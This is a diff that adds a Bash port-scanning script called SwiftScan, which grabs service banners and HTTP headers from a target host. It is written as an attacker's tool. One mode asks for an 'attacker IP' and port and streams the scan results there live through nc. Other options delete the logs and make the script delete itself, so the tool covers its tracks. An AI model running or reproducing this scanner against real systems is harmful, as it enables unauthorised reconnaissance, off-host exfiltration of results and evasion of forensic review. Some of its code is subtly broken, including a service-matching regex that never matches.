@@ -1,0 +1,180 @@
+#!/bin/bash
+show_help() {
+    echo -e "\nSwiftScan - simple TCP + Banner + Remote/Local Logging port scanner \n"
+    echo "usage: $0 -t <host> [options]"
+    echo -e "\noptions:"
+    echo "  -t <host>       sarget host (required)"
+    echo "  -a              scan all 65535 ports (default: 1-1000)"
+    echo "  -p start:end    scan specific port range"
+    echo "  -o <file>       save results to local file"
+    echo "  -s <mode>       logging mode: host (local) or target (send remotely)"
+    echo "  --clean         delete log file AND self-destruct script"
+    echo "  -l              localhost quick scan"
+    echo "  -d              delete logs only"
+    echo "  -h              show help"
+    exit 0
+}
+
+GREEN="\e[32m"; YELLOW="\e[33m"; RED="\e[31m"; RESET="\e[0m"
+
+host=""; start=1; end=1000; all_ports=false; port_override=false
+outfile=""; log_mode="host"; remote_ip=""; remote_port=""
+delete_logs=false; self_destruct=false; localhost_mode=false; clean_all=false
+
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -t) host="$2"; shift 2 ;;
+        -a) all_ports=true; shift ;;
+        -p) 
+            if [[ "$2" =~ ^[0-9]+:[0-9]+$ ]]; then
+                start="${2%%:*}"
+                end="${2##*:}"
+                port_override=true
+            else
+                echo -e "${RED}[!] invalid -p range format. use start:end${RESET}"
+                exit 1
+            fi
+            shift 2 
+            ;;
+        -o) outfile="$2"; shift 2 ;;
+        -s) log_mode="$2"; shift 2 ;;
+        --clean) clean_all=true; shift ;;
+        -l) localhost_mode=true; shift ;;
+        -d) delete_logs=true; shift ;;
+        -h) show_help ;;
+        *) show_help ;;
+    esac
+done
+
+if $localhost_mode; then host="127.0.0.1"; fi
+if [ -z "$host" ]; then
+    echo -e "${RED}[!] target host required (-t <host>)${RESET}"
+    show_help
+fi
+
+if $port_override; then
+    : 
+elif $all_ports; then
+    start=1; end=65535
+fi
+
+if ! [[ "$start" =~ ^[0-9]+$ && "$end" =~ ^[0-9]+$ ]]; then
+    echo -e "${RED}[!] port range must be numeric${RESET}"
+    exit 1
+fi
+[[ "$start" -le 0 ]] && start=1
+[[ "$end" -gt 65535 ]] && end=65535
+[[ "$end" -lt "$start" ]] && { echo -e "${RED}[!] end port must be >= start port${RESET}"; exit 1; }
+
+total_ports=$((end-start+1))
+
+if [[ $log_mode == "target" ]]; then
+    read -rp "enter attacker IP: " remote_ip
+    read -rp "enter attacker port: " remote_port
+    echo -e "${YELLOW}[*] logs will be sent to $remote_ip:$remote_port in live${RESET}"
+    exec 3> >(nc -w 60 "$remote_ip" "$remote_port")
+fi
+
+[[ $outfile && $log_mode == "host" ]] && echo "" > "$outfile"
+
+echo -e "${YELLOW}[*] scanning $host ports $start-$end ...${RESET}"
+
+declare -A services=(
+    [20]="FTP-Data" [21]="FTP" [22]="SSH" [23]="Telnet" [25]="SMTP"
+    [53]="DNS" [67]="DHCP" [68]="DHCP" [69]="TFTP" [80]="HTTP"
+    [110]="POP3" [111]="RPCbind" [123]="NTP" [139]="NetBIOS" [143]="IMAP"
+    [161]="SNMP" [162]="SNMP-Trap" [179]="BGP" [194]="IRC" [389]="LDAP"
+    [443]="HTTPS" [445]="SMB" [465]="SMTPS" [514]="Syslog" [515]="LPD"
+    [520]="RIP" [631]="IPP" [636]="LDAPS" [993]="IMAPS" [995]="POP3S"
+    [1433]="MSSQL" [1521]="Oracle" [1723]="PPTP" [2049]="NFS" [2082]="cPanel"
+    [2083]="cPanel-SSL" [3306]="MySQL" [3389]="RDP" [5432]="PostgreSQL" [5900]="VNC"
+    [6379]="Redis" [8000]="HTTP-Alt" [8080]="HTTP-Alt" [8443]="HTTPS-Alt" [8888]="HTTP-Alt"
+    [10000]="Webmin" [9000]="php"
+)
+
+detect_service() {
+    port=$1
+    service="${services[$port]:-Unknown}"
+    banner=$(timeout 2 nc "$host" "$port" 2>/dev/null | head -n5)
+    [[ $banner ]] && service="$service"
+    http_info=""
+    if [[ $service =~ HTTP|HTTPS|http-alt ]]; then
+        http_info=$(timeout 2 curl -skI "http://$host:$port" 2>/dev/null | head -n10)
+    fi
+    
+    if [[ $service == "Unknown" ]]; then
+        svc=$(grep -w "$port" /etc/services 2>/dev/null | awk '{print $1}' | head -n1)
+        [[ $svc ]] && service="$svc"
+    fi
+
+    if [[ $http_info ]]; then
+        echo "$service|$banner|$http_info"
+    else
+        echo "$service|$banner"
+    fi
+}
+
+send_log() {
+    msg="$1"
+    echo -e "$msg"
+    [[ $outfile ]] && echo -e "$msg" >> "$outfile"
+    [[ $log_mode == "target" ]] && echo -e "$msg" >&3
+}
+
+counter_file="/tmp/swiftscan_counter.tmp"
+echo 0 > "$counter_file"
+
+scan_port() {
+    port=$1
+    if (echo >/dev/tcp/$host/$port) >/dev/null 2>&1; then
+        result=$(detect_service "$port")
+        service="${result%%|*}"
+        rest="${result#*|}"
+        banner="${rest%%|*}"
+        http_info="${rest#*|}"
+        [[ "$http_info" == "$banner" ]] && http_info=""
+
+        output="Port $port OPEN | Service: $service | Banner: ${banner:-N/A}"
+        [[ $http_info ]] && output="$output | HTTP Info:\n$http_info"
+        output="$output\n================================="
+        send_log "$output"
+    fi
+
+    (
+        flock -x 200
+        scanned=$(<"$counter_file")
+        scanned=$((scanned+1))
+        echo "$scanned" > "$counter_file"
+        percent=$((scanned*100/total_ports))
+        echo -ne "\rProgress: $percent% ($scanned/$total_ports)" >&2
+    ) 200>"$counter_file.lock"
+}
+
+export -f scan_port detect_service send_log
+export host outfile total_ports remote_ip remote_port counter_file log_mode
+
+if [[ $log_mode == "host" ]]; then
+    seq $start $end | xargs -n1 -P50 bash -c 'scan_port "$@"' _
+else
+    for port in $(seq $start $end); do
+        scan_port "$port"
+    done
+fi
+
+echo -e "\n${YELLOW}[*] Scan completed.${RESET}"
+[[ $outfile && $log_mode == "host" ]] && echo -e "${YELLOW}[*] results saved to $outfile${RESET}"
+
+if $delete_logs && [[ $outfile ]]; then
+    rm -f "$outfile"
+    echo -e "${YELLOW}[*] local log deleted (-d)${RESET}"
+fi
+
+if $clean_all && [[ $outfile ]]; then
+    rm -f "$outfile"
+    echo -e "${YELLOW}[*] local log deleted (--clean)${RESET}"
+    rm -f "$0" 2>/dev/null
+    echo -e "${YELLOW}[*] SwiftScan script self-deleted (--clean)${RESET}"
+fi
+
+[[ $log_mode == "target" ]] && exec 3>&-
+
